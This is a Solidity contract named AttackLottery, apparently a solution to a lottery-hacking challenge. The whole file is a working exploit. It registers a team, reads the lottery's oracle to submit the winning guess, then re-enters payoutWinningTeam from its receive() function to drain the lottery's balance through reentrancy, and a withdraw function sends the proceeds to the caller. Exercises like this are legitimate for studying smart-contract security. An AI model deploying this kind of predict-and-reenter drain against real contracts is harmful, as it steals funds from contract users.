// SPDX-License-Identifier: UNLICENSED
// It will be stopped until runs out of gas.
pragma solidity 0.8.17;

interface ILottery {
    function registerTeam(
        address _walletAddress,
        string calldata _teamName,
        string calldata _password
    ) external payable;

    function makeAGuess(address _team, uint256 _guess) external returns (bool);

    function payoutWinningTeam(address _team) external returns (bool);
}

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

contract AttackLottery {
    address lo = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
    address or = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;

    event attack_log(string title, uint256 amount);

    function register() external payable {
        ILottery(lo).registerTeam{value: 1_000_000_000}(
            address(this),
            "mokaiko",
            "mokaiko"
        );
    }

    function attack() public payable {
        ILottery(lo).makeAGuess(address(this), IOracle(or).getRandomNumber());
        ILottery(lo).payoutWinningTeam(address(this));
    }

    function withdraw() external payable {
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "Fail to withdraw");
    }

    receive() external payable {
        if (address(lo).balance >= 1 gwei) {
            emit attack_log(
                "start attack, lottery balance:",
                address(lo).balance
            );
            ILottery(lo).payoutWinningTeam(address(this));
        }
    }
}
